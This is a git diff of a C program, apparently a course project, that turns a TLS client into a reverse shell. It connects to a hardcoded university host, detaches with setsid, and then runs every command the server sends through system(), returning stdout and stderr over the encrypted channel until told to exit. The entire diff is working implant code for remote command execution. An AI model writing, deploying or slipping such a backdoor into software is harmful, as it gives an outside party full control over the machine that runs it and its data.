@@ -1,4 +1,4 @@
-// gcc -o client_ssl client_ssl.c -lssl -lcrypto -g
+// gcc -o client client.c -lssl -lcrypto -lpthread -g
 #include <arpa/inet.h>
 #include <fcntl.h>
 #include <netdb.h>
@@ -30,26 +30,26 @@ int create_socket(const char *addr, const int port, sslsocket *ssl_sock);
 int execute(const char *command, int p, char *command_output);
 int verify_cert_time_valid(X509 *cert);
 void cleanup(sslsocket *ssl_sock, X509 *cert);
-void send_msg(SSL *ssl, const char *message);
-void receive_msg(SSL *ssl, char *buf);
+void send_response(int output_length, char *command_output,
+                   sslsocket *ssl_sock);
 void process(sslsocket *ssl_sock, X509 *cert);
-
-static void display(const char *buf) { printf("Received: \"%s\"\n", buf); }
+int display(const char *buf, int p, char *command_output);
 
 int main() {
 
-  char dest_url[] = "sauron.run.montefiore.ulg.ac.be";
+  int ret;
+  char dest_url[] = "plmp.montefiore.uliege.be";
   char addr[16];
   char buf[MAX_STRING_SIZE];
 
   if (!lookup_host(dest_url, addr)) {
-    //fprintf(stderr, "lookup_host() failed\n");
+    fprintf(stderr, "lookup_host() failed\n");
     exit(1);
   }
 
   sslsocket *ssl_sock = malloc(sizeof(sslsocket));
   if (!ssl_sock) {
-    //fprintf(stderr, "malloc() failed\n");
+    fprintf(stderr, "malloc() failed\n");
     exit(1);
   }
 
@@ -62,16 +62,20 @@ int main() {
 
   cert = SSL_get_peer_certificate(ssl_sock->ssl);
   if (cert == NULL) {
-    //fprintf(stderr, "Error: Could not get a certificate from: %s.\n", dest_url);
+    fprintf(stderr, "Error: Could not get a certificate from: %s.\n", dest_url);
     exit(1);
   }
 
   certname = X509_NAME_new();
   certname = X509_get_subject_name(cert);
   if (!verify_cert_time_valid(cert)) {
-    //fprintf(stderr, "Certificat is expired");
-    send_msg(ssl_sock->ssl, "DROP");
-    receive_msg(ssl_sock->ssl, buf);
+    fprintf(stderr, "Certificat is expired");
+    if (SSL_write(ssl_sock->ssl, "DROP", strlen("DROP")) <= 0) {
+      fprintf(stderr, "failed to send message");
+      exit(1);
+    }
+    ret = SSL_read(ssl_sock->ssl, buf, sizeof(buf)); /* get reply & decrypt */
+    buf[ret] = 0;
     cleanup(ssl_sock, cert);
     exit(1);
   }
@@ -84,55 +88,57 @@ int main() {
 void process(sslsocket *ssl_sock, X509 *cert) {
 
   int pid;
-  int pipes[2];
-  int recv_length, output_length;
-  char command[1024];
-  char command_output[1024];
+
+  int recv_length, output_length = 0;
+  char command[MAX_STRING_SIZE];
+  char command_output[MAX_STRING_SIZE];
   int last_cmd_len = 0;
   struct sockaddr_in sa;
 
-  switch ((pid = fork())) {
-  case -1:
-    exit(EXIT_FAILURE);
+  int pipes[2];
+  pipe(pipes);
+  dup2(pipes[1], STDOUT_FILENO);
+  dup2(pipes[1], STDERR_FILENO);
+  close(pipes[1]);
+  fcntl(pipes[0], F_SETFL, fcntl(pipes[0], F_GETFL) | O_NONBLOCK);
+  setsid();
+  SSL_write(ssl_sock->ssl, "CMD", 3);
+  while (1) {
+    output_length = 0;
+    memset(command, 0, MAX_STRING_SIZE);
+    memset(command_output, 0, MAX_STRING_SIZE);
 
-  case 0:
+    recv_length = SSL_read(ssl_sock->ssl, &command, sizeof(command) - 6);
+    if (recv_length > 0) {
 
-    pipe(pipes);
-    dup2(pipes[1], STDOUT_FILENO);
-    dup2(pipes[1], STDERR_FILENO);
-    close(pipes[1]);
-    fcntl(pipes[0], F_SETFL, fcntl(pipes[0], F_GETFL) | O_NONBLOCK);
-
-    setsid();
-    SSL_write(ssl_sock->ssl, "CMD", 3);
-    while (1) // TODO check if socket alive
-    {
-      memset(command, 0, sizeof(command));
-
-      recv_length = SSL_read(ssl_sock->ssl, &command, sizeof(command) - 6);
-      if (recv_length > 0) {
-        // command[recv_length - 1] = '\0';
-        if (strcmp(command, "exit") == 0) {
-          break;
-        }
-
-        system(command);
-        output_length = read(pipes[0], command_output, sizeof(command_output));
-        // output_length = execute(command, pipes[0], command_output);
-
-        if (output_length > 0) {
-          SSL_write(ssl_sock->ssl, command_output, output_length);
-        } else {
-          SSL_write(ssl_sock->ssl, "0", 1);
-        }
-      } else {
-        // Socket is closed
+      if (strcmp(command, "exit") == 0) {
         break;
       }
-    }
 
-    cleanup(ssl_sock, cert);
+      output_length = execute(command, pipes[0], command_output);
+      if (output_length > 0) {
+        SSL_write(ssl_sock->ssl, command_output, output_length);
+      } else {
+        SSL_write(ssl_sock->ssl, "0", 1);
+      }
+    } else {
+      // Socket is closed
+      break;
+    }
   }
+
+  cleanup(ssl_sock, cert);
+}
+
+int execute(const char *command, int p, char *command_output) {
+
+  system(command);
+  int output_length = read(p, command_output, MAX_STRING_SIZE);
+  return output_length;
+}
+
+int display(const char *buf, int p, char *command_output) {
+  return strlen(buf);
 }
 
 /* ---------------------------------------------------------- *
@@ -144,25 +150,6 @@ void cleanup(sslsocket *ssl_sock, X509 *cert) {
   close(ssl_sock->sslfd);
   X509_free(cert);
   SSL_CTX_free(ssl_sock->sslctx);
-}
-
-int execute(const char *command, int p, char *command_output) {
-  system(command);
-  return read(p, command_output, sizeof(command_output));
-}
-
-void send_msg(SSL *ssl, const char *message) {
-  if (SSL_write(ssl, message, strlen(message)) <= 0) {
-    //fprintf(stderr, "failed to send message");
-    exit(1);
-  }
-}
-
-void receive_msg(SSL *ssl, char *buf) {
-  int bytes;
-  memset(buf, 0, MAX_STRING_SIZE);
-  bytes = SSL_read(ssl, buf, sizeof(buf)); /* get reply & decrypt */
-  buf[bytes] = 0;
 }
 
 int lookup_host(const char *host, char *adrr) {
